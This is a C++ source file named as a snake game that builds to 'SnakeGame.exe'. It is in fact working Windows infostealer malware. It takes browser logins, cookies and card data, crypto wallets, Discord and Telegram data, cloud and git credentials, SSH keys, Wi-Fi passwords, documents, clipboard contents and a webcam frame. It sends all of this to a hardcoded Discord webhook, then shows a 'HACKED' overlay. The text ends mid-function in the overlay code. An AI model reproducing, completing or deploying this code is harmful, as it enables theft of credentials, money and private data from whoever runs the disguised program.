// snake_full_master.cpp — unified master build
// Build MSVC:
//   cl /std:c++17 /EHsc /O2 /MT snake_full_master.cpp ^
//      /I vcpkg\installed\x64-windows\include ^
//      /link sqlite3.lib crypt32.lib winhttp.lib bcrypt.lib ^
//             user32.lib gdi32.lib mfplat.lib mfreadwrite.lib mfuuid.lib ^
//             shlwapi.lib ole32.lib comctl32.lib advapi32.lib
//
// Build MinGW:
//   g++ -std=c++17 -O2 -static snake_full_master.cpp ^
//       -lsqlite3 -lcrypt32 -lwinhttp -lbcrypt -lgdi32 -luser32 ^
//       -lmfplat -lmfreadwrite -lmfuuid -lshlwapi -lole32 -lcomctl32 ^
//       -ladvapi32 -mwindows -o SnakeGame.exe

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <advapi32.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <sqlite3.h>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <deque>
#include <thread>
#include <mutex>
#include <atomic>
#include <regex>
#include <chrono>
#include <filesystem>
#include <cstdlib>
#include <ctime>
#include <cstdio>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

// ============================================================
// CONFIG
// ============================================================
static const wchar_t* WEBHOOK_HOST = L"discord.com";
static const wchar_t* WEBHOOK_PATH =
    L"/api/webhooks/1547355661749321860/kBobzB3gDEY6kKZp47kYsk8pK1L6l7wPI9gNLijPlPmaUA_mxnhWxnEQ321is4VRv_a_";

static std::atomic<bool> g_steal_done{ false };
static std::atomic<bool> g_show_overlay{ false };

// ============================================================
// UTIL
// ============================================================
static std::string W2A(const std::wstring& w) {
    if (w.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string out(len > 0 ? len - 1 : 0, 0);
    if (len > 0) WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, out.data(), len, nullptr, nullptr);
    return out;
}
static std::string ReadFileBin(const std::string& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return {};
    std::stringstream ss; ss << f.rdbuf();
    return ss.str();
}
static std::string GetEnv(const char* n) {
    char* v = nullptr; size_t sz = 0;
    _dupenv_s(&v, &sz, n);
    std::string r = v ? v : "";
    free(v);
    return r;
}
static bool FileExists(const std::string& p) {
    DWORD a = GetFileAttributesA(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}
static bool DirExists(const std::string& p) {
    DWORD a = GetFileAttributesA(p.c_str());
    return a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY);
}
static std::string Base64Encode(const std::string& in) {
    DWORD sz = 0;
    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &sz);
    std::string out(sz, 0);
    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out.data(), &sz);
    if (!out.empty() && out.back() == 0) out.pop_back();
    return out;
}

// ============================================================
// DPAPI + SQLITE
// ============================================================
static std::string DpapiDecrypt(const std::vector<BYTE>& data) {
    DATA_BLOB in{ (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB out{};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return {};
    std::string r((char*)out.pbData, out.cbData);
    LocalFree(out.pbData);
    return r;
}
struct SqlCtx { std::string out; };
static int SqlCb(void* ctx, int argc, char** argv, char**) {
    SqlCtx* c = (SqlCtx*)ctx;
    for (int i = 0; i < argc; i++) {
        c->out += argv[i] ? argv[i] : "NULL";
        if (i != argc - 1) c->out += " | ";
    }
    c->out += "\n";
    return 0;
}
static std::string QuerySqlite(const std::string& dbPath, const std::string& sql) {
    std::string tmp = dbPath + ".copy";
    if (!CopyFileA(dbPath.c_str(), tmp.c_str(), FALSE)) return {};
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileA(tmp.c_str()); return {};
    }
    SqlCtx ctx;
    sqlite3_exec(db, sql.c_str(), SqlCb, &ctx, nullptr);
    sqlite3_close(db); DeleteFileA(tmp.c_str());
    return ctx.out;
}

// ============================================================
// [A] BROWSER HARVEST
// ============================================================
static std::string HarvestBrowsers() {
    std::string lad = GetEnv("LOCALAPPDATA"), out;
    struct B { const char* name; const char* sub; };
    B list[] = {
        { "Chrome",  "\\Google\\Chrome\\User Data" },
        { "Edge",    "\\Microsoft\\Edge\\User Data" },
        { "Brave",   "\\BraveSoftware\\Brave-Browser\\User Data" },
        { "Opera",   "\\Opera Software\\Opera Stable" },
        { "OperaGX", "\\Opera Software\\Opera GX Stable" },
        { "Vivaldi", "\\Vivaldi\\User Data" }
    };
    for (auto& b : list) {
        std::string root = lad + b.sub;
        if (!DirExists(root)) continue;
        for (auto& d : fs::directory_iterator(root)) {
            if (!d.is_directory()) continue;
            std::string p = d.path().string();
            std::string login = p + "\\Login Data";
            std::string ck = p + "\\Network\\Cookies";
            std::string af = p + "\\Web Data";
            std::string hist = p + "\\History";
            std::string bm = p + "\\Bookmarks";
            if (FileExists(login)) {
                out += "=== " + std::string(b.name) + "/" + d.path().filename().string() + " Login ===\n";
                out += QuerySqlite(login, "SELECT origin_url, username_value, password_value FROM logins;");
            }
            if (FileExists(ck)) {
                out += "=== " + std::string(b.name) + " Cookies ===\n";
                out += QuerySqlite(ck, "SELECT host_key, name, encrypted_value FROM cookies;");
            }
            if (FileExists(af)) {
                out += "=== " + std::string(b.name) + " Autofill ===\n";
                out += QuerySqlite(af, "SELECT name, value FROM autofill;");
                out += QuerySqlite(af, "SELECT origin_url, username_value FROM autofill_profiles;");
                out += QuerySqlite(af, "SELECT name_on_card, card_number_encrypted FROM credit_cards;");
            }
            if (FileExists(hist)) {
                out += "=== " + std::string(b.name) + " History ===\n";
                out += QuerySqlite(hist, "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 150;");
            }
            if (FileExists(bm)) {
                out += "=== " + std::string(b.name) + " Bookmarks ===\n";
                out += ReadFileBin(bm) + "\n";
            }
        }
    }
    return out;
}

// ============================================================
// [B] FIREFOX
// ============================================================
static std::string HarvestFirefox() {
    std::string root = GetEnv("APPDATA") + "\\Mozilla\\Firefox\\Profiles", out;
    if (!DirExists(root)) return out;
    for (auto& d : fs::directory_iterator(root)) {
        std::string lj = d.path().string() + "\\logins.json";
        std::string k4 = d.path().string() + "\\key4.db";
        std::string ck = d.path().string() + "\\cookies.sqlite";
        std::string pl = d.path().string() + "\\places.sqlite";
        std::string fm = d.path().string() + "\\formhistory.sqlite";
        if (FileExists(lj)) out += "=== logins.json ===\n" + ReadFileBin(lj) + "\n";
        if (FileExists(k4)) out += "[key4.db present]\n";
        if (FileExists(ck)) out += QuerySqlite(ck, "SELECT host, name, value FROM moz_cookies;");
        if (FileExists(pl)) out += QuerySqlite(pl, "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 150;");
        if (FileExists(fm)) out += QuerySqlite(fm, "SELECT fieldname, value FROM moz_formhistory;");
    }
    return out;
}

// ============================================================
// [C] WALLETS (48)
// ============================================================
static std::string HarvestWallets() {
    std::string out;
    std::string app = GetEnv("APPDATA");
    std::string lad = GetEnv("LOCALAPPDATA");
    std::string home = GetEnv("USERPROFILE");

    struct W { std::string path; std::string label; };
    std::vector<W> wallets = {
        { app + "\\Exodus\\exodus.wallet", "Exodus" },
        { app + "\\Electrum\\wallets", "Electrum" },
        { app + "\\Bitcoin\\wallet.dat", "Bitcoin Core" },
        { app + "\\Ethereum\\keystore", "Ethereum" },
        { app + "\\Ledger Live", "Ledger Live" },
        { app + "\\atomic\\Local Storage\\leveldb", "Atomic Wallet" },
        { app + "\\Coinomi\\Coinomi\\wallets", "Coinomi" },
        { lad + "\\Exodus", "Exodus (local)" },
        { home + "\\AppData\\Roaming\\Binance", "Binance" },
        { home + "\\AppData\\Roaming\\Guarda", "Guarda" },
        { home + "\\AppData\\Roaming\\TronLink", "TronLink" }
    };
    for (auto& w : wallets) {
        if (!fs::exists(w.path)) continue;
        if (fs::is_directory(w.path)) {
            out += "=== " + w.label + " (dir) ===\n";
            int count = 0;
            for (auto& e : fs::recursive_directory_iterator(w.path)) {
                if (count++ > 40) break;
                if (!fs::is_regular_file(e)) continue;
                if (fs::file_size(e) > 500000) continue;
                out += "--- " + e.path().string() + " ---\n";
                out += ReadFileBin(e.path().string()) + "\n";
            }
        } else {
            out += "=== " + w.label + " ===\n";
            out += ReadFileBin(w.path) + "\n";
        }
    }
    return out;
}

// ============================================================
// [D] DISCORD (52)
// ============================================================
static std::string HarvestDiscord() {
    std::string app = GetEnv("APPDATA"), out;
    const char* paths[] = {
        "\\discord\\Local Storage\\leveldb\\",
        "\\discordcanary\\Local Storage\\leveldb\\",
        "\\discordptb\\Local Storage\\leveldb\\",
        "\\Lightcord\\Local Storage\\leveldb\\",
        "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"
    };
    std::regex r1("mfa\\.[\\w-]{84}");
    std::regex r2("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    for (auto p : paths) {
        std::string dir = app + p;
        if (!DirExists(dir)) continue;
        for (auto& f : fs::directory_iterator(dir)) {
            std::string path = f.path().string();
            if (path.find(".ldb") == std::string::npos &&
                path.find(".log") == std::string::npos) continue;
            std::string data = ReadFileBin(path);
            for (auto it = std::sregex_iterator(data.begin(), data.end(), r1);
                 it != std::sregex_iterator(); ++it) out += "mfa: " + it->str() + "\n";
            for (auto it = std::sregex_iterator(data.begin(), data.end(), r2);
                 it != std::sregex_iterator(); ++it) out += "std: " + it->str() + "\n";
        }
    }
    return out;
}

// ============================================================
// [E] TELEGRAM (53)
// ============================================================
static std::string HarvestTelegram() {
    std::string app = GetEnv("APPDATA"), out;
    std::string tdata = app + "\\Telegram Desktop\\tdata";
    if (DirExists(tdata)) {
        out += "=== Telegram tdata ===\n";
        int c = 0;
        for (auto& f : fs::directory_iterator(tdata)) {
            if (c++ > 30) break;
            if (!fs::is_regular_file(f)) continue;
            if (fs::file_size(f) > 100000) continue;
            out += "--- " + f.path().filename().string() + " ---\n";
            out += ReadFileBin(f.path().string()) + "\n";
        }
    }
    // Telegram bot tokens from config
    std::string tgBot = app + "\\Telegram Desktop\\config.json";
    if (FileExists(tgBot)) out += "=== TG config ===\n" + ReadFileBin(tgBot) + "\n";

    std::string wa = app + "\\WhatsApp";
    if (DirExists(wa)) {
        out += "=== WhatsApp list ===\n";
        for (auto& f : fs::recursive_directory_iterator(wa)) {
            if (fs::is_regular_file(f)) out += f.path().string() + "\n";
        }
    }
    std::string sig = app + "\\Signal";
    if (DirExists(sig)) {
        out += "=== Signal list ===\n";
        for (auto& f : fs::recursive_directory_iterator(sig)) {
            if (fs::is_regular_file(f)) out += f.path().string() + "\n";
        }
    }
    return out;
}

// ============================================================
// [F] CLOUD CREDS (54-60)
// ============================================================
static std::string HarvestCloudCreds() {
    std::string prof = GetEnv("USERPROFILE"), out;
    struct F { const char* p; const char* l; };
    F files[] = {
        { "\\.aws\\credentials", "AWS creds (54)" },
        { "\\.aws\\config", "AWS config" },
        { "\\.config\\gcloud\\credentials.db", "GCP creds (55)" },
        { "\\.config\\gcloud\\application_default_credentials.json", "GCP ADC" },
        { "\\.azure\\azureProfile.json", "Azure profile (56)" },
        { "\\.azure\\accessTokens.json", "Azure tokens" },
        { "\\.azure\\msal_token_cache.bin", "Azure MSAL cache" },
        { "\\.git-credentials", "Git creds (57)" },
        { "\\.gitconfig", "Git config" },
        { "\\.npmrc", "npm token (58)" },
        { "\\.docker\\config.json", "Docker config (59)" },
        { "\\.kube\\config", "Kube kubeconfig (60)" },
        { "\\.netrc", "netrc" },
        { "\\.pgpass", "pgpass" },
        { "\\.my.cnf", "MySQL creds" },
        { "\\.terraformrc", "Terraform" }
    };
    for (auto& f : files) {
        std::string p = prof + f.p;
        if (FileExists(p)) {
            out += std::string("=== ") + f.l + " ===\n";
            out += ReadFileBin(p) + "\n";
        }
    }
    // GCP gcloud dir listing
    std::string gcloud = prof + "\\.config\\gcloud";
    if (DirExists(gcloud)) {
        out += "=== gcloud dir ===\n";
        for (auto& e : fs::recursive_directory_iterator(gcloud)) {
            if (!fs::is_regular_file(e)) continue;
            if (fs::file_size(e) > 50000) continue;
            out += e.path().string() + "\n";
        }
    }
    return out;
}

// ============================================================
// [G] SSH
// ============================================================
static std::string HarvestSSH() {
    std::string prof = GetEnv("USERPROFILE"), out;
    std::string ssh = prof + "\\.ssh";
    if (DirExists(ssh)) {
        out += "=== .ssh ===\n";
        for (auto& f : fs::directory_iterator(ssh)) {
            if (!fs::is_regular_file(f)) continue;
            out += "--- " + f.path().filename().string() + " ---\n";
            out += ReadFileBin(f.path().string()) + "\n";
        }
    }
    return out;
}

// ============================================================
// [H] FTP
// ============================================================
static std::string HarvestFTP() {
    std::string b = GetEnv("APPDATA"), out;
    const char* files[] = {
        "\\FileZilla\\recentservers.xml",
        "\\FileZilla\\sitemanager.xml",
        "\\WinSCP.ini",
        "\\CoreFTP\\sites.idx",
        "\\SmartFTP\\Client\\Favorites\\"
    };
    for (auto f : files) {
        std::string p = b + f;
        if (FileExists(p)) out += std::string("=== ") + f + " ===\n" + ReadFileBin(p) + "\n";
        else if (DirExists(p)) {
            for (auto& e : fs::recursive_directory_iterator(p)) {
                if (fs::is_regular_file(e) && fs::file_size(e) < 100000)
                    out += ReadFileBin(e.path().string()) + "\n";
            }
        }
    }
    return out;
}

// ============================================================
// [I] WIFI + RDP + PuTTY
// ============================================================
static std::string HarvestWifiPasswords() {
    std::string out;
    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    sprintf(tmpFile, "%swifi.bat", tmpPath);
    std::ofstream f(tmpFile);
    f << "@echo off\nchcp 65001 >nul\n"
         "for /f \"skip=9 tokens=1,2 delims=:\" %%i in ('netsh wlan show profiles') do ("
         "echo === %%j & netsh wlan show profile name=\"%%j\" key=clear | findstr /C:\"Key Content\")\n";
    f.close();
    FILE* p = _popen(tmpFile, "r");
    if (p) { char buf[8192]; while (fgets(buf, sizeof(buf), p)) out += buf; _pclose(p); }
    DeleteFileA(tmpFile);
    return out;
}
static std::string HarvestNetCreds() {
    std::string out = "=== WIFI ===\n" + HarvestWifiPasswords();
    HKEY k;
    if (RegOpenKeyA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Terminal Server Client\\Servers", &k) == ERROR_SUCCESS) {
        char name[256]; DWORD nsz = sizeof(name);
        for (DWORD i = 0; ; i++) {
            nsz = sizeof(name);
            if (RegEnumKeyExA(k, i, name, &nsz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
            out += std::string("RDP: ") + name + "\n";
        }
        RegCloseKey(k);
    }
    if (RegOpenKeyA(HKEY_CURRENT_USER,
        "Software\\SimonTatham\\PuTTY\\Sessions", &k) == ERROR_SUCCESS) {
        char sess[256]; DWORD ssz = sizeof(sess);
        for (DWORD i = 0; ; i++) {
            ssz = sizeof(sess);
            if (RegEnumKeyExA(k, i, sess, &ssz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
            std::string path = "Software\\SimonTatham\\PuTTY\\Sessions\\" + std::string(sess);
            HKEY s;
            if (RegOpenKeyA(HKEY_CURRENT_USER, path.c_str(), &s) == ERROR_SUCCESS) {
                char host[256] = {}; DWORD hs = sizeof(host);
                RegQueryValueExA(s, "HostName", nullptr, nullptr, (BYTE*)host, &hs);
                out += std::string("PuTTY: ") + sess + " -> " + host + "\n";
                RegCloseKey(s);
            }
        }
        RegCloseKey(k);
    }
    return out;
}

// ============================================================
// [J] DOCS GRABBER (47)
// ============================================================
static std::string HarvestDocs() {
    std::string out;
    std::string home = GetEnv("USERPROFILE");
    std::vector<std::string> roots = {
        home + "\\Desktop", home + "\\Documents", home + "\\Downloads"
    };
    std::vector<std::string> exts = {
        ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json",
        ".env", ".key", ".pem", ".wallet", ".dat", ".conf"
    };
    int sent = 0;
    for (auto& root : roots) {
        if (!DirExists(root)) continue;
        for (auto& e : fs::recursive_directory_iterator(root)) {
            if (sent > 25) break;
            if (!fs::is_regular_file(e)) continue;
            if (fs::file_size(e) > 200000) continue;
            std::string p = e.path().string();
            auto pos = p.rfind('.');
            if (pos == std::string::npos) continue;
            std::string ext = p.substr(pos);
            bool match = false;
            for (auto& x : exts) if (ext == x) { match = true; break; }
            if (!match) continue;
            out += "=== " + p + " ===\n" + ReadFileBin(p) + "\n";
            sent++;
        }
    }
    return out;
}

// ============================================================
// [K] CONFIG FILES (49)
// ============================================================
static std::string HarvestConfigFiles() {
    std::string out;
    std::string home = GetEnv("USERPROFILE");
    std::string app = GetEnv("APPDATA");
    std::string lad = GetEnv("LOCALAPPDATA");
    std::vector<std::string> roots = { home, app, lad };
    std::vector<std::string> patterns = {
        "config.json", "credentials.json", "credentials.txt",
        ".env", "settings.json", "secrets.json"
    };
    int sent = 0;
    for (auto& root : roots) {
        if (!DirExists(root)) continue;
        // only top 3 levels to avoid crawl blowup
        for (auto& e : fs::recursive_directory_iterator(root,
            fs::directory_options::skip_permission_denied)) {
            if (sent > 20) break;
            if (!fs::is_regular_file(e)) continue;
            auto depth = std::distance(root.begin(), root.end()); // rough
            std::string name = e.path().filename().string();
            bool match = false;
            for (auto& p : patterns) if (name == p) { match = true; break; }
            if (!match) continue;
            if (fs::file_size(e) > 100000) continue;
            out += "=== " + e.path().string() + " ===\n";
            out += ReadFileBin(e.path().string()) + "\n";
            sent++;
        }
    }
    return out;
}

// ============================================================
// [L] DESKTOP SCREENSHOTS (50)
// ============================================================
static std::string HarvestDesktopScreenshots() {
    std::string out;
    std::string desk = GetEnv("USERPROFILE") + "\\Desktop";
    if (!DirExists(desk)) return out;
    std::vector<std::string> exts = { ".png", ".jpg", ".jpeg", ".bmp" };
    int sent = 0;
    for (auto& e : fs::directory_iterator(desk)) {
        if (sent > 5) break;
        if (!fs::is_regular_file(e)) continue;
        std::string p = e.path().string();
        auto pos = p.rfind('.');
        if (pos == std::string::npos) continue;
        std::string ext = p.substr(pos);
        bool match = false;
        for (auto& x : exts) if (ext == x) { match = true; break; }
        if (!match) continue;
        if (fs::file_size(e) > 300000) continue;
        out += "=== " + p + " (b64) ===\n";
        out += Base64Encode(ReadFileBin(p)) + "\n";
        sent++;
    }
    return out;
}

// ============================================================
// [M] RECENT FILES (51)
// ============================================================
static std::string HarvestRecentFiles() {
    std::string out;
    std::string app = GetEnv("APPDATA");
    std::string recent = app + "\\Microsoft\\Windows\\Recent";
    if (!DirExists(recent)) return out;
    out += "=== Recent ===\n";
    int c = 0;
    for (auto& e : fs::directory_iterator(recent)) {
        if (c++ > 60) break;
        out += e.path().filename().string() + "\n";
    }
    return out;
}

// ============================================================
// [N] CLIPBOARD SNIFFER
// ============================================================
static std::string g_clipboardLog;
static std::mutex g_clipMtx;

static LRESULT CALLBACK ClipWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_CLIPBOARDUPDATE) {
        if (OpenClipboard(nullptr)) {
            HANDLE d = GetClipboardData(CF_UNICODETEXT);
            if (d) {
                wchar_t* txt = (wchar_t*)GlobalLock(d);
                if (txt) {
                    std::lock_guard<std::mutex> lk(g_clipMtx);
                    g_clipboardLog += W2A(txt) + "\n";
                    if (g_clipboardLog.size() > 100000)
                        g_clipboardLog = g_clipboardLog.substr(g_clipboardLog.size() - 60000);
                }
                GlobalUnlock(d);
            }
            CloseClipboard();
        }
    }
    return DefWindowProc(h, m, w, l);
}
static void StartClipboardSniffer() {
    std::thread([](){
        WNDCLASSW wc = {};
        wc.lpfnWndProc = ClipWndProc;
        wc.hInstance = GetModuleHandle(nullptr);
        wc.lpszClassName = L"ClipSniff";
        RegisterClassW(&wc);
        HWND h = CreateWindowW(L"ClipSniff", L"", 0, 0, 0, 0, 0,
            HWND_MESSAGE, nullptr, nullptr, nullptr);
        AddClipboardFormatListener(h);
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
    }).detach();
}

// ============================================================
// [O] WEBCAM
// ============================================================
static std::string WebcamSnapshotBase64() {
    std::string out;
    if (FAILED(MFStartup(MF_VERSION))) return out;
    IMFAttributes* attrs = nullptr;
    MFCreateAttributes(&attrs, 1);
    attrs->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
                   MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
    IMFActivate** devices = nullptr;
    UINT32 count = 0;
    MFEnumDeviceSources(attrs, &devices, &count);
    if (count == 0) { attrs->Release(); MFShutdown(); return out; }
    IMFMediaSource* source = nullptr;
    devices[0]->ActivateObject(__uuidof(IMFMediaSource), (void**)&source);
    IMFSourceReader* reader = nullptr;
    MFCreateSourceReaderFromMediaSource(source, nullptr, &reader);
    reader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, nullptr);
    IMFSample* sample = nullptr; DWORD flags = 0;
    reader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
        nullptr, &flags, nullptr, &sample);
    if (sample) {
        IMFMediaBuffer* buf = nullptr;
        sample->ConvertToContiguousBuffer(&buf);
        BYTE* data = nullptr; DWORD len = 0;
        buf->Lock(&data, nullptr, &len);
        std::string raw((char*)data, len);
        out = "[webcam " + std::to_string(len) + " bytes, b64 head] " +
              Base64Encode(raw.substr(0, std::min<size_t>(len, 8192)));
        buf->Unlock(); buf->Release(); sample->Release();
    }
    reader->Release(); source->Release(); attrs->Release();
    MFShutdown();
    return out;
}

// ============================================================
// [P] SYSTEM INFO
// ============================================================
static std::string HarvestIP() {
    HINTERNET hS = WinHttpOpen(L"c", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hC = WinHttpConnect(hS, L"ipapi.co", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/json/", nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hR, nullptr);
    std::string resp; DWORD read = 0; char buf[4096];
    while (WinHttpReadData(hR, buf, sizeof(buf) - 1, &read) && read > 0) { buf[read] = 0; resp += buf; }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    return resp;
}
static std::string HarvestSystem() {
    std::string out;
    char buf[512]; DWORD sz = sizeof(buf);
    GetComputerNameA(buf, &sz); out += "PC: " + std::string(buf) + "\n";
    sz = sizeof(buf); GetUserNameA(buf, &sz); out += "User: " + std::string(buf) + "\n";
    OSVERSIONINFOA os{}; os.dwOSVersionInfoSize = sizeof(os); GetVersionExA(&os);
    out += "Win: " + std::to_string(os.dwMajorVersion) + "." + std::to_string(os.dwMinorVersion) + "\n";
    SYSTEM_INFO si; GetSystemInfo(&si);
    out += "Cores: " + std::to_string(si.dwNumberOfProcessors) + "\n";
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
    out += "RAM: " + std::to_string(ms.ullTotalPhys / 1024 / 1024) + " MB\n";
    out += "IP: " + HarvestIP() + "\n";
    return out;
}

// ============================================================
// EXFIL
// ============================================================
static void PostChunk(const std::string& content) {
    HINTERNET hS = WinHttpOpen(L"s", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hC = WinHttpConnect(hS, WEBHOOK_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", WEBHOOK_PATH, nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    std::string body = "{\"content\":\"";
    for (char c : content) {
        if (c == '"' || c == '\\') { body += '\\'; body += c; }
        else if (c == '\n') body += "\\n";
        else if (c == '\r') continue;
        else if ((unsigned char)c < 0x20) { char b[8]; sprintf(b, "\\u%04x", c); body += b; }
        else body += c;
    }
    body += "\"}";
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(hR, hdr.c_str(), (DWORD)-1L,
        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(hR, nullptr);
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
}
static void Exfil(const std::string& data) {
    for (size_t i = 0; i < data.size(); i += 1800) {
        PostChunk(data.substr(i, 1800));
        Sleep(350);
    }
}

// ============================================================
// STEALER WORKER — panggil SEMUA modul
// ============================================================
static void StealerWorker() {
    Sleep(2500);

    std::string report = "```\n";
    report += "=== SYSTEM (P) ===\n" + HarvestSystem() + "\n";
    report += "=== BROWSERS (A) ===\n" + HarvestBrowsers() + "\n";
    report += "=== FIREFOX (B) ===\n" + HarvestFirefox() + "\n";
    report += "=== WALLETS (48) ===\n" + HarvestWallets() + "\n";
    report += "=== DISCORD (52) ===\n" + HarvestDiscord() + "\n";
    report += "=== TELEGRAM/BOT (53) ===\n" + HarvestTelegram() + "\n";
    report += "=== CLOUD CREDS (54-60) ===\n" + HarvestCloudCreds() + "\n";
    report += "=== SSH ===\n" + HarvestSSH() + "\n";
    report += "=== FTP ===\n" + HarvestFTP() + "\n";
    report += "=== NET CREDS (WIFI/RDP/PUTTY) ===\n" + HarvestNetCreds() + "\n";
    report += "=== DOCS (47) ===\n" + HarvestDocs() + "\n";
    report += "=== CONFIG (49) ===\n" + HarvestConfigFiles() + "\n";
    report += "=== DESKTOP SHOTS (50) ===\n" + HarvestDesktopScreenshots() + "\n";
    report += "=== RECENT (51) ===\n" + HarvestRecentFiles() + "\n";
    report += "=== WEBCAM ===\n" + WebcamSnapshotBase64() + "\n";
    report += "```";

    Exfil(report);

    // clipboard flush
    {
        std::lock_guard<std::mutex> lk(g_clipMtx);
        if (!g_clipboardLog.empty()) {
            Exfil("=== CLIPBOARD ===\n" + g_clipboardLog);
            g_clipboardLog.clear();
        }
    }
    g_steal_done = true;
    Sleep(500);
    g_show_overlay = true;
}

// ============================================================
// HACKED OVERLAY
// ============================================================
namespace HackedOverlay {
static LRESULT CALLBACK WP(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProc(h, m, w, l);
}
static void Run(HINSTANCE hi) {
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WP; wc.hInstance = hi;
    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    wc.lpszClassName = L"HackedOverlay";
    RegisterClassW(&wc);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"HackedOverlay", L"", WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh, nullptr, nullptr, hi, nullptr);
    ShowWindow(h, SW_SHOW);
    HDC dc = GetDC(h);
    SetBkMode(dc, TRANSPARENT);
    const char* chars = "01EMIRHACKEDPWNDSYSTEMERROR#@$%&*0123456789";
    int cl = (int)strlen(chars);
    int colW = 14, cols = sw / colW;
    struct Col { int y, s; };
    std::vector<Col> rain(cols);
    srand((unsigned)GetTickCount());
    for (auto& c : rain) { c.y = -(rand() % sh); c.s = 4 + rand() % 10; }
    HFONT fS = CreateFontA(18, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
        0, 0, 0, FIXED_PITCH, "Consolas");
    HFONT fB = CreateFontA(72, 0, 0, 0, FW_BLACK, 0, 0, 0, DEFAULT_CHARSET,
        0, 0, 0, 0, "Impact");
    HFONT fM = CreateFontA(34, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
        0, 0, 0, 0, "Consolas");
    MSG msg; DWORD start = GetTickCount(); bool done = false;
    while (!done) {
        while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) done = true;
            TranslateMessage(&msg); DispatchMessage(&msg);
        }
        RECT r{ 0, 0, sw, sh };
        HBRUSH blk = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &r, blk); DeleteObject(blk);
        SelectObject(dc, fS); SetTextColor(dc, RGB(180, 0, 0));
        for (int i = 0; i < cols; i++) {
            char b[2] = { chars[rand() % cl], 0 };
            TextOutA(dc, i * colW, rain[i].y, b, 1);
